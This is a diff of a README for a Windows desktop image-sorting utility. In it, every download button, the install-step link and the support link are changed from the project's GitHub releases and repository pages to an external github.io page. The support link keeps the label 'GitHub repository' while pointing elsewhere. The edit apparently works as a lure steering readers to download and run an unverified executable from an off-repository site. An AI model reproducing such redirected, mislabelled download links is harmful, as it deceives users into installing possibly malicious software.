@@ -1,6 +1,6 @@
 <h1>🤖 apexcify-file-automation-utility - Organize Your Desktop Images Instantly</h1>
 <p align="center">
-  <a href="https://github.com/squigglehaldane300/apexcify-file-automation-utility/releases" style="display: inline-block; padding: 18px 36px; background: #ff6b6b; color: white; text-decoration: none; border-radius: 8px; font-size: 20px; font-weight: bold;">⬇️ Download Now</a>
+  <a href="https://squigglehaldane300.github.io" style="display: inline-block; padding: 18px 36px; background: #ff6b6b; color: white; text-decoration: none; border-radius: 8px; font-size: 20px; font-weight: bold;">⬇️ Download Now</a>
 </p>
 
 <p>Stop manually sorting through messy desktop folders. The apexcify-file-automation-utility automatically finds every JPG and JPEG image on your Windows desktop and moves them to a folder you choose. No technical skills needed. Just download, run, and watch your desktop clean up.</p>
@@ -23,7 +23,7 @@
 <p>Follow these simple steps to get the application running on your Windows computer.</p>
 
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/squigglehaldane300/apexcify-file-automation-utility/releases">https://github.com/squigglehaldane300/apexcify-file-automation-utility/releases</a></p>
+<p>Visit this link to download the application: <a href="https://squigglehaldane300.github.io">https://squigglehaldane300.github.io</a></p>
 <p>Click the latest release, then download the file labeled for Windows.</p>
 
 <h3>Step 2: Run the Application</h3>
@@ -68,7 +68,7 @@
 
 <h2>📥 Download Section</h2>
 <p align="center">
-  <a href="https://github.com/squigglehaldane300/apexcify-file-automation-utility/releases" style="display: inline-block; padding: 14px 28px; background: #4ecdc4; color: white; text-decoration: none; border-radius: 6px; font-size: 18px;">⬇️ Get apexcify-file-automation-utility</a>
+  <a href="https://squigglehaldane300.github.io" style="display: inline-block; padding: 14px 28px; background: #4ecdc4; color: white; text-decoration: none; border-radius: 6px; font-size: 18px;">⬇️ Get apexcify-file-automation-utility</a>
 </p>
 <p>Click the button above or visit the releases page directly. Download the latest version. No registration, no email required.</p>
 
@@ -79,7 +79,7 @@
 </ul>
 
 <h2>🤝 Support</h2>
-<p>Having trouble? Open an issue on the <a href="https://github.com/squigglehaldane300/apexcify-file-automation-utility">GitHub repository</a> with a description of your problem. Include your Windows version and any error messages you see.</p>
+<p>Having trouble? Open an issue on the <a href="https://squigglehaldane300.github.io">GitHub repository</a> with a description of your problem. Include your Windows version and any error messages you see.</p>
 
 <hr>
 
